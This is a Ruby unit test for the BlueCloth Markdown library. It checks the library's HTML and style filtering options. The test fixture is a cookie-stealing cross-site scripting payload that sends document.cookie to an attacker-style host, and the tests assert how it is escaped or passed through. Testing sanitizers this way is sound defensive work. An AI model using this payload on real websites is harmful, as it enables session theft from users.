#!/usr/bin/ruby -w
#
# Unit test for contributed features 
# $Id: TEMPLATE.rb.tpl,v 1.2 2003/09/11 04:59:51 deveiant Exp $
#
# Copyright (c) 2004 The FaerieMUD Consortium.
# 

if File::exists?( "lib/bluecloth.rb" )
	require 'tests/bctestcase'
else
	require 'bctestcase'
end


### This test case tests ...
class ContribTestCase < BlueCloth::TestCase

	DangerousHtml =
		"<script>document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie</script>"
	DangerousHtmlOutput =
		"<p>&lt;script&gt;document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie&lt;/script&gt;</p>"
	DangerousStylesOutput =
		"<script>document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie</script>"


	### HTML filter options contributed by Florian Gross.

	### Test the :filter_html restriction
	def test_10_filter_html
		printTestHeader "filter_html Option"
		rval = bc = nil

		# Test as a 1st-level param
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, :filter_html )
		}
		assert_instance_of BlueCloth, bc

		# Accessors
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousHtmlOutput, rval

		# Test setting it in a sub-array
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, [:filter_html] )
		}
		assert_instance_of BlueCloth, bc
		
		# Accessors
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousHtmlOutput, rval
	end


	### Test the :filter_styles restriction
	def test_20_filter_styles
		printTestHeader "filter_styles Option"
		rval = bc = nil

		# Test as a 1st-level param
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, :filter_styles )
		}
		assert_instance_of BlueCloth, bc
		
		# Accessors
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousStylesOutput, rval

		# Test setting it in a subarray
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, [:filter_styles] )
		}
		assert_instance_of BlueCloth, bc

		# Accessors
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousStylesOutput, rval

	end


end

